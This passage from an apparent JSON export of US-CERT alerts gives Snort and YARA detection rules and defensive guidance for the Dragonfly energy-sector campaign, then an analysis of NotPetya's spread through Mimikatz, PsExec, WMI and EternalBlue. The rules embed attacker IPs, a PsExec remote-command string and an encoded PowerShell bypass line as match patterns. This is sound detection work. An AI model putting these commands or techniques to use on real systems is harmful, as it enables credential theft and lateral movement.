http;)</code></p><p><code>________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp any any -&gt; any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)</code></p><p>________________________________________</p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1; flow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]{3}=[a-z0-9]{32}&amp;/U\"; classtype:bad-unknown; metadata:service http;)</code></p><p><code>__________________________________________</code></p><p><code>alert tcp $EXTERNAL_NET [139,445] -&gt; $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1; flow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad-unknown; metadata:service netbios-ssn;)</code><br /> </p><h5>YARA Rules</h5><p>This is a consolidated rule set for malware associated with, consisting of rules written by US-CERT, as well as contributions by trusted partners.</p><p><code>*/</code></p><p> </p><p><code>rule APT_malware_1</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"inveigh pen testing tools &amp; related artifacts\"</code></p><p><code>      author = \"US-CERT Code Analysis Team\"    </code></p><p><code>      date = \"2017/07/17\"</code></p><p><code>      hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"</code></p><p><code>      hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"</code></p><p><code>      hash2 = \"BA756DD64C1147515BA2298B6A760260\"</code></p><p><code>      hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"</code></p><p><code>      hash4 = \"04738CA02F59A5CD394998A99FCD9613\"</code></p><p><code>      hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"</code></p><p><code>      hash6 = \"65A1A73253F04354886F375B59550B46\"</code></p><p><code>      hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"</code></p><p><code>      hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"</code></p><p><code>      hash9 = \"722154A36F32BA10E98020A8AD758A7A\"</code></p><p><code>      hash10 = \"4595DBE00A538DF127E0079294C87DA0\"</code></p><p><code>strings:</code></p><p><code>      $s0 = \"file://\"</code></p><p><code>      $s1 = \"/ame_icon.png\"</code></p><p><code>      $s2 = \"184.154.150.66\"</code></p><p><code>      $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }</code></p><p><code>      $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }</code></p><p><code>      $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"</code></p><p><code>      $s6 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"</code></p><p><code>      $s8 = \"NlZzSZk=\"</code></p><p><code>      $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"</code></p><p><code>      $s10 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"</code></p><p><code>      $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"</code></p><p><code>      $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }</code></p><p><code>      $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }</code></p><p><code>      $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }</code></p><p> </p><p> </p><p><code>//inveigh pentesting tools</code></p><p> </p><p><code>      $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }</code></p><p> </p><p><code>//specific malicious word document PK archive</code></p><p> </p><p><code>      $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }</code></p><p><code>      $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }</code></p><p><code>      $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }</code></p><p><code>      $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s22 = \"5.153.58.45\"</code></p><p><code>      $s23 = \"62.8.193.206\"</code></p><p><code>      $s24 = \"/1/ree_stat/p\"</code></p><p><code>      $s25 = \"/icon.png\"</code></p><p><code>      $s26 = \"/pshare1/icon\"</code></p><p><code>      $s27 = \"/notepad.png\"</code></p><p><code>      $s28 = \"/pic.png\"</code></p><p><code>      $s29 = \"http://bit.ly/2m0x8IH\"</code></p><p><code>     </code></p><p><code>condition:</code></p><p><code>      ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)</code></p><p><code>}</code></p><p> </p><p><code>rule APT_malware_2</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"rule detects malware\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }</code></p><p><code>      $http_push = \"X-mode: push\" nocase</code></p><p><code>      $http_pop = \"X-mode: pop\" nocase</code></p><p><code>condition:</code></p><p><code>      any of them</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC_PT_2</code></p><p><code>{</code></p><p><code>      meta:</code></p><p><code>            name= \"Query_XML_Code_MAL_DOC_PT_2\"</code></p><p><code>            author = \"other\"</code></p><p><code>      strings:</code></p><p><code>            $zip_magic = { 50 4b 03 04 }</code></p><p><code>            $dir1 = \"word/_rels/settings.xml.rels\"</code></p><p><code>            $bytes = {8c 90 cd 4e eb 30 10 85 d7}</code></p><p><code>      condition:</code></p><p><code>            $zip_magic at 0 and $dir1 and $bytes</code></p><p><code>}</code></p><p> </p><p><code>rule Query_Javascript_Decode_Function</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_Javascript_Decode_Function\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}</code></p><p><code>      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}</code></p><p><code>      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}</code></p><p><code>      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}</code></p><p><code>      $func_call=\"a(\\\"\"</code></p><p><code>condition:</code></p><p><code>      filesize &lt; 20KB and #func_call &gt; 20 and all of ($decode*)</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_XML_Code_MAL_DOC\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $zip_magic = { 50 4b 03 04 }</code></p><p><code>      $dir = \"word/_rels/\" ascii</code></p><p><code>      $dir2 = \"word/theme/theme1.xml\" ascii</code></p><p><code>      $style = \"word/styles.xml\" ascii</code></p><p><code>condition:</code></p><p><code>      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd</code></p><p><code>}</code></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>This APT actor’s campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>DHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.</p><h4>Network and Host-based Signatures</h4><p>DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to their watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network has experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to identify malicious activity.</p><h4>Detections and Prevention Measures</h4><ul><li>Users and administrators can detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the IOC packages to the following locations:<ul><li>network intrusion detection system/network intrusion protection system  logs,</li><li>web content logs,</li><li>proxy server logs,</li><li>domain name server resolution logs,</li><li>packet capture (PCAP) repositories,</li><li>firewall logs,</li><li>workstation Internet browsing history logs,</li><li>host-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,</li><li>data loss prevention logs,</li><li>exchange server logs,</li><li>user mailboxes,</li><li>mail filter logs,</li><li>mail content logs,</li><li>AV mail logs,</li><li>OWA logs,</li><li>Blackberry Enterprise Server logs, and</li><li>Mobile Device Management logs.</li></ul></li><li>To detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following locations:<ul><li>application logs,</li><li>IIS/Apache logs,</li><li>file system,</li><li>intrusion detection system/ intrusion prevention system logs,</li><li>PCAP repositories,</li><li>firewall logs, and</li><li>reverse proxy.</li></ul></li><li>Detect spear-phishing by searching workstation file systems, as well as network-based user directories, for attachment filenames and hashes found in the IOC packages.</li><li>Detect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.</li><li>Detect evasion techniques by the threat actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system logs.</li><li>Detect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.</li><li>Detect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be reviewed by the account owners.</li><li>Detect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.</li><li>Detect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.</li><li>Detect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.</li><li>Detect persistence on servers by searching system logs for all filenames listed in the IOC packages.</li><li>Detect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell version 5, and PowerShell logging must be enabled prior to the activity.)</li><li>Detect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.</li><li>Detect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”. Services\\MaxInstanceCount” and the value of “REG_DWORD 1” at location “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.</li><li>Detect installation by searching all proxy logs for downloads from URIs without domain names.</li></ul><h4>General Best Practices Applicable to this Campaign:</h4><ul><li>Prevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the NCCIC/US-CERT publication on <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\">SMB Security Best Practices </a>for more information.</li><li>Block the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.</li><li>Monitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).</li><li>Deploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and downloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on the host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.</li><li>Segment any critical networks or control systems from business systems and networks according to industry best practices.</li><li>Ensure adequate logging and visibility on ingress and egress points.</li><li>Ensure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands an attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for monitoring and analysis. See the FireEye blog post <a href=\"http://Greater Visibility through PowerShell Logging\">Greater Visibility through PowerShell Logging </a>for more information.</li><li>Implement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\">Compromised Web Servers and Web Shells – Threat Awareness and Guidance</a>.</li><li>Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.</li><li>Implement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</li><li>Block RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.</li><li>Store system logs of mission critical systems for at least one year within a security information event management tool.</li><li>Ensure applications are configured to log the proper level of detail for an incident response investigation.</li><li>Consider implementing HIPS or other controls to prevent unauthorized code execution.</li><li>Establish least-privilege controls.</li><li>Reduce the number of Active Directory domain and enterprise administrator accounts.</li><li>Based on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.</li><li>Establish a password policy to require complex passwords for all users.</li><li>Ensure that accounts for network administration do not have external connectivity.</li><li>Ensure that network administrators use non-privileged accounts for email and Internet access.</li><li>Use two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access, privileged access, and access to sensitive data).</li><li>Implement a process for logging and auditing activities conducted by privileged accounts.</li><li>Enable logging and alerting on privilege escalations and role changes.</li><li>Periodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for sensitive data that may have inadvertently been included.</li><li>Assign sufficient personnel to review logs, including records of alerts.</li><li>Complete independent security (as opposed to compliance) risk review.</li><li>Create and participate in information sharing programs.</li><li>Create and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of asset, and an incident response plan.</li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870.</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"\">[1] FireEye. Factors Motivating Cyber Espionage Against the Energy Sector. September 3, 2015 09:21:00AM, 15-00008886, Version: 2</a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017. </a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017.</a></li>\n            \t\t    \t<li><a href=\"\">[4] CCIRC CF17-010 UPDATE</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5] MIFR-10127623</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>October 20, 2017: Initial version</li>\n\t\t    \t\t\t    \t<li>March 15, 2018: Updated to provide guidance that this alert has been superseded by newer information.</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-10-20T22:50:54.000Z"
		},
		{
			"type": "report",
			"title": "TA17-181A: Petya Ransomware",
			"name": "TA17-181A: Petya Ransomware",
			"id": "report--603028c6-7a03-4194-8159-a9ef21278a81",
			"description": "Original release date: July 01, 2017 | Last revised: February 15, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Microsoft Windows operating systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p><em>This Alert has been updated to reflect the U.S. Government's public attribution of the \"NotPetya\" malware variant to the Russian military. Additional information may be found in a <a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a>.<em> For more information related to NotPetya activity, go to <a href=\"https://www.us-cert.gov/grizzlysteppe\">https://www.us-cert.gov/grizzlysteppe</a>.</em></em></p><p>The scope of this Alert’s analysis is limited to the newest Petya malware variant that surfaced on June 27, 2017. This malware is referred to as “NotPetya” throughout this Alert.</p><p>On June 27, 2017, NCCIC <a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13]</a> was notified of Petya malware events occurring in multiple countries and affecting multiple sectors. This variant of the Petya malware—referred to as NotPetya—encrypts files with extensions from a hard-coded list. Additionally, if the malware gains administrator rights, it encrypts the master boot record (MBR), making the infected Windows computers unusable. NotPetya differs from previous Petya malware primarily in its propagation methods. </p><p>The NCCIC Code Analysis Team produced a Malware Initial Findings Report (MIFR) to provide in-depth technical analysis of the malware. In coordination with public and private sector partners, NCCIC is also providing additional indicators of compromise (IOCs) in comma-separated-value (CSV) form for information sharing purposes.</p><p>Available Files:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295.pdf\">MIFR-10130295.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295_stix.xml\">MIFR-10130295_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-181B_IOCs.csv\">TA-17-181B_IOCs.csv</a></li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>NotPetya leverages multiple propagation methods to spread within an infected network. According to malware analysis, NotPetya attempts the lateral movement techniques below:</p><ul><li>PsExec - a legitimate Windows administration tool</li><li>WMI - Windows Management Instrumentation, a legitimate Windows component</li><li>EternalBlue - the same Windows SMBv1 exploit used by WannaCry</li><li>EternalRomance - another Windows SMBv1 exploit</li></ul><p>Microsoft released a security update for the <a href=\"https://technet.microsoft.com/library/security/MS17-010\">MS17-010</a> SMB vulnerability on March 14, 2017, which addressed the EternalBlue and EternalRomance lateral movement techniques.</p><p><strong>Technical Details</strong></p><p>NCCIC received a sample of the NotPetya malware variant and performed a detailed analysis. Based on the analysis, NotPetya encrypts the victim’s files with a dynamically generated, 128-bit key and creates a unique ID of the victim. However, there is no evidence of a relationship between the encryption key and the victim’s ID, which means it may not be possible for the attacker to decrypt the victim’s files even if the ransom is paid. It behaves more like destructive malware rather than ransomware.</p><p>NCCIC observed multiple methods used by NotPetya to propagate across a network. The first and—in most cases—most effective method, uses a modified version of the Mimikatz tool to steal the user’s Windows credentials. The cyber threat actor can then use the stolen credentials, along with the native Windows Management Instrumentation Command Line (WMIC) tool or the Microsoft SysInternals utility, psexec.exe, to access other systems on the network. Another method for propagation uses the EternalBlue exploit tool to target unpatched systems running a vulnerable version of SMBv1. In this case, the malware attempts to identify other hosts on the network by checking the compromised system’s IP physical address mapping table. Next, it scans for other systems that are vulnerable to the SMB exploit and installs the malicious payload. Refer to the malware report, MIFR-10130295, for more details on these methods.</p><p>The analyzed sample of NotPetya encrypts the compromised system’s files with a 128-bit Advanced Encryption Standard (AES) algorithm during runtime. The malware then writes a text file on the “C:\\” drive that includes a static Bitcoin wallet location as well as unique personal installation key intended for the victim to use when making the ransom payment and the user’s Bitcoin wallet ID. NotPetya modifies the master boot record (MBR) to enable encryption of the master file table (MFT) and the original MBR, and then reboots the system. Based on the encryption methods used, it appears unlikely that the files could be restored, even if the attacker received the victim’s unique key and Bitcoin wallet ID.</p><p>The delivery mechanism of NotPetya during the June 27, 2017, event was determined to be the Ukrainian tax accounting software, M.E.Doc. The cyber threat actors used a backdoor to compromise M.E. Doc’s development environment as far back as April 14, 2017. This backdoor allowed the threat actor to run arbitrary commands, exfiltrate files, and download and execute arbitrary exploits on the affected system. Organizations should treat systems with M.E.Doc installed as suspicious, and should examine these systems for additional malicious activity. <a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12]</a></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>According to multiple reports, this NotPetya malware campaign has infected organizations in several sectors, including finance, transportation, energy, commercial facilities, and healthcare. While these victims are business entities, other Windows systems are also at risk, such as:</p><ul><li>those that do not have patches installed for the vulnerabilities in MS17‑010, CVE-2017-0144, and CVE-2017-0145, and</li><li>those who operate on the  shared network of affected organizations.</li></ul><p>Negative consequences of malware infection include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>NCCIC recommends against paying ransoms; doing so enriches malicious actors while offering no guarantee that the encrypted files will be released. In this NotPetya incident, the email address for payment validation was shut down by the email provider, so payment is especially unlikely to lead to data recovery.<a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1]</a> According to one NCCIC stakeholder, the sites listed below sites are used for payment in this activity. These sites are not included in the CSV package as IOCs.</p><p>hxxp://mischapuk6hyrn72[.]onion/<br />hxxp://petya3jxfp2f7g3i[.]onion/<br />hxxp://petya3sen7dyko2n[.]onion/<br />hxxp://mischa5xyix2mrhd[.]onion/MZ2MMJ<br />hxxp://mischapuk6hyrn72[.]onion/MZ2MMJ<br />hxxp://petya3jxfp2f7g3i[.]onion/MZ2MMJ<br />hxxp://petya3sen7dyko2n[.]onion/MZ2MMJ</p><p><strong>Network Signatures</strong></p><p>NCCIC recommends that organizations coordinate with their security vendors to ensure appropriate coverage for this threat. Given the overlap of functionality and the similarity of behaviors between WannaCry and NotPetya, many of the available rulesets can protect against both malware types when appropriately implemented. The following rulesets provided in publically available sources may help detect activity associated with these malware types:</p><ul><li>sid:2001569, “ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection”<a href=\"http://doc.emergingthreats.net/2001569\">[2]</a></li><li>sid:2012063, “ET NETBIOS Microsoft SRV2.SYS SMB Negotiate ProcessID? Function Table Dereference (CVE-2009-3103)”<a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3]</a></li><li>sid:2024297, “ET CURRENT_EVENTS ETERNALBLUE Exploit M2 MS17-010”<a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4]</a></li><li>sid:42944,\"OS-WINDOWS Microsoft Windows SMB remote code execution attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:42340,\"OS-WINDOWS Microsoft Windows SMB anonymous session IPC share access attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:41984,\"OS-WINDOWS Microsoft Windows SMBv1 identical MID and FID type confusion attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li></ul><p><strong>Recommended Steps for Prevention</strong></p><p>Review US-CERT’s Alert on The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6]</a>, and consider implementing the following best practices:</p><ul><li>Ensure you have fully patched your systems, and confirm that you have applied Microsoft’s patch for the MS17-010 SMB vulnerability dated March 14, 2017.<a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5]</a></li><li>Conduct regular backups of data and test your backups regularly as part of a comprehensive disaster recovery plan.</li><li>Ensure anti-virus and anti-malware solutions are set to automatically conduct regular scans.</li><li>Manage the use of privileged accounts. Implement the principle of least privilege. Do not assign administrative access to users unless absolutely needed. Those with a need for administrator accounts should only use them when necessary. </li><li>Configure access controls, including file, directory, and network share permissions with the principle of least privilege in mind. If a user only needs to read specific files, they should not have write access to those files, directories, or shares. </li><li>Secure use of WMI by authorizing WMI users and setting permissions.</li><li>Utilize host-based firewalls and block workstation-to-workstation communications to limit unnecessary lateral communications.</li><li>Disable or limit remote WMI and file sharing.</li><li>Block remote execution through PSEXEC.</li><li>Segregate networks and functions.</li><li>Harden network devices and secure access to infrastructure devices.</li><li>Perform out-of-band network management.</li><li>Validate integrity of hardware and software.</li><li>Disable SMBv1 and block all versions of SMB at the network boundary by blocking TCP port 445 with related protocols on UDP ports 137-138 and TCP port 139; this applies to all boundary devices.</li></ul><p><strong><em>Note:</em></strong><em> Disabling or blocking SMB may create problems by obstructing access to shared files, data, or devices. Weigh the benefits of mitigation against potential disruptions to users.</em></p><p><strong>Recommended Steps for Remediation</strong></p><ul><li>NCCIC strongly encourages organizations contact a local Federal Bureau of Investigation (FBI) field office upon discovery to report an intrusion and request assistance. Maintain and provide relevant logs.</li><li>Implement a security incident response and business continuity plan. Ideally, organizations should ensure they have appropriate backups so their response is simply to restore the data from a known clean backup. </li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov%20\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870. You can also report cyber crime incidents to the Internet Crime Complaint Center (IC3) at <a href=\"https://www.ic3.gov/default.aspx\">https://www.ic3.gov/default.aspx</a>.</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a></li>\n            \t\t    \t<li><a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1] Bleeping Computer: Email Provider Shuts Down Petya Inbox Preventing Victims From Recovering Files</a></li>\n            \t\t    \t<li><a href=\"http://doc.emergingthreats.net/2001569\">[2] Emerging Threats 2001569</a></li>\n            \t\t    \t<li><a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3] Emerging Threats 2012063</a></li>\n            \t\t    \t<li><a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4] Emerging Threats 2024297</a></li>\n            \t\t    \t<li><a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5] Microsoft: Security Bulletin MS17-010</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6] US-CERT: The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a></li>\n            \t\t    \t<li><a href=\"https://labsblog.f-secure.com/2017/06/30/eternal-petya-from-a-developers-perspective/\">[7] F-Secure: (Eternal) Petya from a Developer’s Perspective</a></li>\n            \t\t    \t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/\">[8] Microsoft |TechNet: New ransomware, old techniques: Petya adds worm capabilities </a></li>\n            